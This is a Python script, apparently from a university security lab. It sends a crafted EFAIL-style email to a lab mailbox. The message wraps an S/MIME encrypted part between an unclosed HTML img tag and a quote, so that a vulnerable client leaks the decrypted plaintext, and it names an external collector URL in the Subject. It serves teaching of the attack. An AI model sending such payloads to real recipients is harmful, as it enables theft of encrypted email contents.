# This email client script doesn't work with the demo script

import smtplib
import getpass

# Insert your credentials: UPB loginID and password. You can also use a different mail server
login = "ashwani"
password = getpass.getpass()  # you can alo use getpass.getpass() to ask for the password interactively

# Check your UPB email address
sender = login + "@mail.uni-paderborn.de"

# No changes here
receiver = "efail.rub@mail.de"

# This is the original email (from encmail.eml)
# Insert the modified email content
# Change "Subject" to your personal URL e.g. a ngrok address
message = """From: sender.efail.upb@mail.de
To: efail.rub@mail.de
Subject: https://eo7xhiacd08h8bb.m.pipedream.net/
Content-Type: multipart/mixed;boundary="BOUNDARY"

---BOUNDARY
Content-Type: text/html

<img src=//e.de/
---BOUNDARY
Content-Type: application/pkcs7-mime;smime-type=enveloped-data
Content-Transfer-Encoding: base64

MIIDLQYJKoZIhvcNAQcDoIIDHjCCAxoCAQAxggGxMIIBrQIBADCBljB+MQswCQYD
VQQGEwJERTEMMAoGA1UECAwDTlJXMQ8wDQYDVQQHDAZCb2NodW0xDDAKBgNVBAoM
A1JVQjEMMAoGA1UECwwDTkRTMRIwEAYDVQQDDAlSZWNpcGllbnQxIDAeBgkqhkiG
9w0BCQEWEWVmYWlsLnJ1YkBtYWlsLmRlAhQNtwmb/MirMg0aAvxekg1ZDT4TkTAL
BgkqhkiG9w0BAQEEggEAFds2qAuvkMQFKokyLPpZyHD1Q7vFGooD72sHHFLEPhR/
bLKCUvqP/H53dETQ0l069J9uI9Any+dXXe3+dtQGr3nE3tq5uc/YcIn2P/WWzDH4
clWB0XS2R/W7OESQ6VEPqHNzdfvyydJJtgmVv1d2uxaF7S0uWZMSmsyjdPHEfgqs
MkF4oeKPaQ/wN+t+XUfMG0mB4V8F3TivFfOM7GZIcOGPq1pVxSyjtU5DlyM+tXiJ
1CpElb+VC3kdz2cimooHwPKakE09OTRQG5v68c5Xe14fSUpgsBRTc2e0SYyfbEi5
f6n9iVDmfKWUFH3Yz0tldM6LZlv4PGIHY7kDGciWCTCCAV4GCSqGSIb3DQEHATAd
BglghkgBZQMEASoEENMgsKwG+56a5G2KmSiidm+AggEw6zSq6B3H5Cqbt0HMxKGl
hUL5aJJRZj0JB7oZ1B5cQUAxAMWiRUvUBVHaPgm6o56TZ+tOX6l7NYslIEyFiOer
mcRJuE8vqpJLwxGVtjOtPvVmMRLBNbPL2GTPSeTL24XcQ4TiH5DOQD3KA0REVUNa
8MaYTDRJlMCTRwiwIWKxRSqnGsPUI3eb3V3jo+0l3mS4FgiXQdMPCyUBQXXPHoOe
f/za2SmgXLbaXJm2u3es8hA6LyDXGCGaINs7Y7gqywzNOVvWYtgkRjHvzEQMGIB6
MSijmNC21x0dbPVqWdwwkZUaZ24RIEqQbljoL4fYqeuVLocIDNhSHJ3jB17GYTP7
KI1IXu+9UQqaUzbmzS6WRJOhIeMA8/lPVOvhF5t3eFQIZMcDqWM7/4UZwQ/rNFyp
lg==
---BOUNDARY
Content-Type: text/html
">
---BOUNDARY---
"""

# If you use your UPB email address: no changes here
try:
    smtpObj = smtplib.SMTP_SSL("mail.uni-paderborn.de", 465)
    smtpObj.login(login, password)
    smtpObj.sendmail(sender, receiver, message)
    print("Successfully sent email")
except smtplib.SMTPException as e:
    print("Error: unable to send email", e)
